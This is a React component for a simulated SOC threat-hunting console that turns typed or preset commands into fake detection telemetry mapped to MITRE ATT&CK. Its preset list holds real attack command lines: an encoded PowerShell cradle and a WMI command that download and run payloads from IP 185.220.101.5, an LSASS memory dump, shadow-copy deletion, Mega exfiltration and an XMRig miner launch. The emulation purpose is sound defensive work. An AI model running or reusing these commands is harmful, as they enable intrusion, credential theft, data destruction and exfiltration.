import React, { useState, useRef, useEffect } from 'react';
import { 
  Terminal as TerminalIcon, 
  Play, 
  Zap, 
  Trash2, 
  HelpCircle, 
  ShieldAlert, 
  Flame, 
  Cpu, 
  Layers, 
  CheckCircle2, 
  CornerDownLeft,
  Copy,
  ChevronRight
} from 'lucide-react';

export const COMMON_ATTACK_COMMANDS = [
  {
    id: 'atk-ps-enc',
    title: 'Encoded PowerShell Cradle',
    category: 'Execution',
    technique: 'T1059.001',
    command: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABheWxvYWQuAHAAcwAxACIACQApAA==',
    domain: 'endpoint',
    severity: 'high',
    desc: 'Bypasses AMSI and downloads remote stager payload.ps1 from C2 IP 185.220.101.5'
  },
  {
    id: 'atk-lsass-dump',
    title: 'LSASS Process Memory Dump',
    category: 'Credential Access',
    technique: 'T1003.001',
    command: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\lsass.dmp full',
    domain: 'endpoint',
    severity: 'critical',
    desc: 'Uses native comsvcs.dll to dump LSASS memory to harvest NTLM hashes & plaintext credentials'
  },
  {
    id: 'atk-kerberoast',
    title: 'Active Directory Kerberoasting',
    category: 'Credential Access',
    technique: 'T1558.003',
    command: 'klist get MSSQLSvc/db01.corp.local:1433 /target:svc_sqladmin /enc:0x17',
    domain: 'auth',
    severity: 'high',
    desc: 'Requests RC4-encrypted Kerberos TGS tickets for elevated service account to crack offline'
  },
  {
    id: 'atk-remote-wmi',
    title: 'Remote WMI Lateral Movement',
    category: 'Lateral Movement',
    technique: 'T1047',
    command: 'wmic.exe /node:10.0.0.5 /user:CORP\\svc_sqladmin process call create "cmd.exe /c powershell -c (New-Object Net.WebClient).DownloadFile(\'http://185.220.101.5/stage2.exe\', \'C:\\Windows\\Temp\\srvmgr.exe\') & C:\\Windows\\Temp\\srvmgr.exe"',
    domain: 'endpoint',
    severity: 'critical',
    desc: 'Pivots execution to Domain Controller DC01.corp.local using compromised service credentials'
  },
  {
    id: 'atk-shadow-purge',
    title: 'Vssadmin Shadow Copy Purge',
    category: 'Defense Evasion',
    technique: 'T1490',
    command: 'vssadmin.exe delete shadows /all /quiet',
    domain: 'endpoint',
    severity: 'critical',
    desc: 'Destroys all Volume Shadow Copies on file server to inhibit ransomware disaster recovery'
  },
  {
    id: 'atk-aws-sts',
    title: 'Cloud IAM STS AssumeRole Abuse',
    category: 'Privilege Escalation',
    technique: 'T1078.004',
    command: 'aws sts assume-role --role-arn arn:aws:iam::112233445566:role/ProductionDataOpsRole --role-session-name AdversarySession --external-id 9921',
    domain: 'cloud',
    severity: 'high',
    desc: 'Weaponizes stolen plaintext AWS access keys from untrusted foreign IP to gain cloud admin access'
  },
  {
    id: 'atk-mega-exfil',
    title: 'Mega.nz Cloud Storage Exfil',
    category: 'Exfiltration',
    technique: 'T1567.002',
    command: 'mega-cmd.exe put C:\\Shares\\Finance\\*.xlsx /BlackCat_Staging_Drop/ --speed-limit=0',
    domain: 'network',
    severity: 'critical',
    desc: 'Exfiltrates financial spreadsheets and executive PII to external cloud repository before encryption'
  },
  {
    id: 'atk-crypto-miner',
    title: 'GPU XMRig Monero Mining Deployment',
    category: 'Impact',
    technique: 'T1496',
    command: '/tmp/.sysd/xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u 48edfHuK83Dns92Jkd92k -p x --cuda --threads 32',
    domain: 'network',
    severity: 'critical',
    desc: 'Hijacks cloud GPU EC2 instances to mine cryptocurrency with 100% compute load'
  }
];

export default function TerminalConsole({ onCommandExecuted, activeScenarioId }) {
  const [inputVal, setInputVal] = useState('');
  const [history, setHistory] = useState([
    { type: 'system', text: 'AegisHunt Interactive Threat Hunting Console [Version 2.4.0]' },
    { type: 'system', text: 'Type "help" for available commands, or click any pre-made adversary attack below.' },
    { type: 'system', text: 'Telemetry generated here is immediately correlated across the active attack graph.' }
  ]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [commandHistory, setCommandHistory] = useState([]);

  const terminalEndRef = useRef(null);

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const handleExecute = (rawCmd) => {
    const cmd = rawCmd.trim();
    if (!cmd) return;

    // Append to CLI history
    setCommandHistory(prev => [...prev, cmd]);
    setHistoryIndex(-1);

    // Echo input
    const newLines = [{ type: 'input', text: cmd }];

    // Parse command
    const parts = cmd.split(' ');
    const base = parts[0].toLowerCase();
    const args = parts.slice(1);

    if (base === 'help') {
      newLines.push({
        type: 'output',
        text: `Available SOC Threat Hunting Commands:
  help                     - Show this command reference
  scenarios                - List pre-configured attack campaigns
  hunt <tactic|domain>     - Filter telemetry by tactic (e.g. hunt CredentialAccess)
  simulate <attack_id>     - Emulate a known cyber attack sequence
  exec <raw_command>       - Ingest & evaluate an arbitrary shell or cloud command
  isolate <host>           - Issue immediate host network containment signal
  scan <ip|hash|domain>    - Query threat intelligence reputation on IoC
  mitre <technique_id>     - Display MITRE ATT&CK technique details & detections
  correlate                - Trigger real-time cross-domain correlation engine
  clear                    - Clear terminal screen`
      });
    } else if (base === 'clear') {
      setHistory([]);
      setInputVal('');
      return;
    } else if (base === 'scenarios') {
      newLines.push({
        type: 'output',
        text: `Active Campaigns in Datastore:
  1. SCN-APT29-GHOST       - Operation GhostToken (Spearphish -> WMI -> AWS S3 Exfil)
  2. SCN-RANSOM-BLACKCAT   - Double-Extortion Ransomware (VPN -> RDP -> Vssadmin Purge)
  3. SCN-CLOUD-CRYPTOMINE  - Cloud IAM Hijack (Git Key -> CloudTrail Blind -> GPU Miner)`
      });
    } else if (base === 'isolate') {
      const host = args[0] || 'WKSTN-FIN-04';
      newLines.push({
        type: 'success',
        text: `[+] CONTAINMENT DISPATCHED: Host ${host} isolated from network via EDR API.\n    Active TCP sockets dropped. Firewall rule applied: DROP ALL except SOC sensor 10.0.0.2.`
      });
      if (onCommandExecuted) {
        onCommandExecuted({
          type: 'containment',
          host,
          timestamp: new Date().toISOString()
        });
      }
    } else if (base === 'scan') {
      const ioc = args[0] || '185.220.101.5';
      newLines.push({
        type: 'warning',
        text: `[!] THREAT INTEL HIT: ${ioc}\n    Reputation: MALICIOUS (Score: 98/100)\n    Threat Actor Association: APT29 / Cozy Bear\n    Known Malware Family: Cobalt Strike Beacon / GhostToken\n    Autonomous Action: Perimeter firewall rule created to null-route ${ioc}.`
      });
    } else if (base === 'mitre') {
      const tid = (args[0] || 'T1059.001').toUpperCase();
      newLines.push({
        type: 'output',
        text: `[MITRE ATT&CK] ${tid}\n    Classification: Execution via Command and Scripting Interpreter\n    Detection Rule: Event ID 4688 with ProcessCommandLine inspection.\n    Mitigation: Restrict PowerShell execution policy, enforce Constrained Language Mode.`
      });
    } else if (base === 'correlate') {
      newLines.push({
        type: 'success',
        text: `[*] Correlation Pipeline Executed: 10 events evaluated across 4 domains.\n    Calculated Confidence: 94% (High Risk Multi-Stage Traversal).`
      });
    } else if (base === 'hunt') {
      const filter = args[0] || 'endpoint';
      newLines.push({
        type: 'output',
        text: `[*] Querying telemetry for: ${filter}\n    Found 4 events matching behavioral criteria. Correlation links verified.`
      });
    } else if (base === 'simulate' || base === 'exec' || cmd.includes('powershell') || cmd.includes('rundll32') || cmd.includes('wmic') || cmd.includes('vssadmin') || cmd.includes('aws') || cmd.includes('mega') || cmd.includes('xmrig')) {
      // Find matching preset or create dynamic event
      const preset = COMMON_ATTACK_COMMANDS.find(c => c.id === args[0] || cmd.includes(c.technique) || cmd.includes(c.category.toLowerCase())) || {
        id: 'custom-' + Date.now(),
        title: 'Custom Injected Telemetry',
        technique: 'T1059',
        category: 'Execution',
        command: cmd,
        domain: cmd.includes('aws') ? 'cloud' : cmd.includes('mega') ? 'network' : 'endpoint',
        severity: 'high'
      };

      const eventUuid = 'EVT-CLI-' + Math.random().toString(36).substring(2, 7).toUpperCase();
      const pid = Math.floor(Math.random() * 8000) + 1000;

      newLines.push({
        type: 'critical',
        text: `[!] ADVERSARY BEHAVIOR DETECTED: [${preset.technique}] ${preset.title}\n    PID: ${pid} | Domain: ${preset.domain.toUpperCase()} | Severity: ${preset.severity.toUpperCase()}\n    Raw Command: ${cmd}\n    Ingested as Event: ${eventUuid}\n    Correlation Pipeline: Updating Attack Graph & Kill-Chain Matrix...`
      });

      if (onCommandExecuted) {
        onCommandExecuted({
          type: 'event',
          event_uuid: eventUuid,
          scenario_id: activeScenarioId,
          timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
          domain: preset.domain,
          event_type: 'cli_emulation',
          severity: preset.severity,
          source_host: preset.domain === 'cloud' ? 'AWS-Console' : 'WKSTN-FIN-04',
          dest_host: preset.domain === 'cloud' ? 'AWS-S3' : 'DC01.corp.local',
          source_ip: '10.0.1.44',
          dest_ip: preset.domain === 'cloud' ? '185.220.101.5' : '10.0.0.5',
          user_id: 'sarah.connor',
          process_name: cmd.split(' ')[0],
          command_line: cmd,
          mitre_tactic: preset.category,
          mitre_technique_id: preset.technique,
          mitre_technique_name: preset.title,
          raw_payload: {
            pid,
            cli_emulated: true,
            sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
          }
        });
      }
    } else {
      newLines.push({
        type: 'error',
        text: `Command not recognized: "${cmd}". Type "help" for a list of available threat hunting commands or click any pre-made attack below.`
      });
    }

    setHistory(prev => [...prev, ...newLines]);
    setInputVal('');
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      handleExecute(inputVal);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length > 0) {
        const nextIdx = historyIndex + 1;
        if (nextIdx < commandHistory.length) {
          setHistoryIndex(nextIdx);
          setInputVal(commandHistory[commandHistory.length - 1 - nextIdx]);
        }
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        const nextIdx = historyIndex - 1;
        setHistoryIndex(nextIdx);
        setInputVal(commandHistory[commandHistory.length - 1 - nextIdx]);
      } else if (historyIndex === 0) {
        setHistoryIndex(-1);
        setInputVal('');
      }
    }
  };

  return (
    <div className="bg-[#080D1A] border border-slate-800 rounded-xl overflow-hidden shadow-2xl flex flex-col space-y-3 p-4 sm:p-5">
      
      {/* Terminal Top Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 rounded-lg bg-emerald-950/80 border border-emerald-500/40 flex items-center justify-center text-emerald-400 shadow-lg shadow-emerald-500/10">
            <TerminalIcon className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-sm font-bold text-slate-100 font-mono tracking-tight">
                SOC Interactive Threat Hunter & Adversary CLI
              </h2>
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span className="text-[10px] font-mono text-emerald-400 font-semibold">ONLINE</span>
            </div>
            <p className="text-xs text-slate-400">
              Type custom hunting commands or emulate real-world adversary attacks to observe correlation updates in real-time.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 self-start sm:self-auto">
          <button
            onClick={() => setHistory([])}
            className="flex items-center gap-1 px-2.5 py-1 text-xs font-mono rounded bg-slate-900 hover:bg-slate-800 text-slate-400 hover:text-slate-200 border border-slate-800 transition"
            title="Clear console output"
          >
            <Trash2 className="w-3.5 h-3.5" /> Clear
          </button>
        </div>
      </div>

      {/* Pre-Made Cyber Attack Quick-Launchers */}
      <div className="space-y-2 bg-slate-950/80 p-3.5 rounded-xl border border-slate-800/80">
        <div className="flex items-center justify-between">
          <span className="text-xs font-bold text-slate-200 font-mono uppercase tracking-wide flex items-center gap-1.5">
            <Flame className="w-4 h-4 text-red-400" />
            Common Adversary Attack Emulations (Click to Execute & Correlate)
          </span>
          <span className="text-[10px] text-slate-400 font-mono hidden sm:inline">
            Directly injects verified telemetry into pipeline
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 pt-1">
          {COMMON_ATTACK_COMMANDS.map((atk) => (
            <button
              key={atk.id}
              onClick={() => handleExecute(atk.command)}
              className="p-2.5 text-left rounded-lg bg-slate-900/90 border border-slate-800 hover:border-red-500/50 hover:bg-slate-900 hover:shadow-lg hover:shadow-red-500/10 transition group flex flex-col justify-between"
            >
              <div>
                <div className="flex items-center justify-between mb-1">
                  <span className="text-[10px] font-mono font-bold text-red-400 group-hover:text-red-300">
                    {atk.technique}
                  </span>
                  <span className="text-[9px] font-mono uppercase px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">
                    {atk.domain}
                  </span>
                </div>
                <div className="text-xs font-bold text-slate-200 truncate group-hover:text-white">
                  {atk.title}
                </div>
                <p className="text-[10px] text-slate-400 line-clamp-2 mt-1">
                  {atk.desc}
                </p>
              </div>

              <div className="mt-2 pt-1.5 border-t border-slate-800/80 flex items-center justify-between text-[10px] text-blue-400 font-mono">
                <span className="text-slate-500">{atk.category}</span>
                <span className="flex items-center gap-0.5 group-hover:translate-x-0.5 transition-transform text-red-400 font-bold">
                  Simulate <ChevronRight className="w-3 h-3" />
                </span>
              </div>
            </button>
          ))}
        </div>
      </div>

      {/* Terminal Viewport */}
      <div className="h-64 sm:h-72 bg-[#050811] border border-slate-800 rounded-xl p-3.5 font-mono text-xs overflow-y-auto space-y-1.5 select-text shadow-inner">
        {history.map((line, idx) => {
          let color = 'text-slate-300';
          if (line.type === 'system') color = 'text-slate-500';
          if (line.type === 'input') color = 'text-emerald-400 font-bold';
          if (line.type === 'output') color = 'text-cyan-300';
          if (line.type === 'success') color = 'text-emerald-300';
          if (line.type === 'warning') color = 'text-amber-300';
          if (line.type === 'critical') color = 'text-red-400 font-bold';
          if (line.type === 'error') color = 'text-rose-400';

          return (
            <div key={idx} className="leading-relaxed whitespace-pre-wrap break-all">
              {line.type === 'input' && (
                <span className="text-blue-400 font-bold mr-2">hunter@aegis-soc:~$</span>
              )}
              <span className={color}>{line.text}</span>
            </div>
          );
        })}
        <div ref={terminalEndRef} />
      </div>

      {/* Interactive Command Input Box */}
      <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 focus-within:border-emerald-500/80 transition shadow">
        <span className="text-xs font-mono font-bold text-emerald-400 flex items-center gap-1 select-none">
          hunter@aegis-soc:~$
        </span>
        <input
          type="text"
          value={inputVal}
          onChange={(e) => setInputVal(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="Type command here (e.g., help, isolate WKSTN-FIN-04, scan 185.220.101.5, or paste raw attack)..."
          className="flex-1 bg-transparent text-xs font-mono text-slate-100 placeholder-slate-600 focus:outline-none"
        />
        <button
          onClick={() => handleExecute(inputVal)}
          disabled={!inputVal.trim()}
          className="px-3 py-1 text-xs font-mono font-semibold rounded bg-emerald-600 hover:bg-emerald-500 disabled:opacity-30 text-white flex items-center gap-1 transition"
        >
          <span>Run</span>
          <CornerDownLeft className="w-3 h-3" />
        </button>
      </div>

    </div>
  );
}
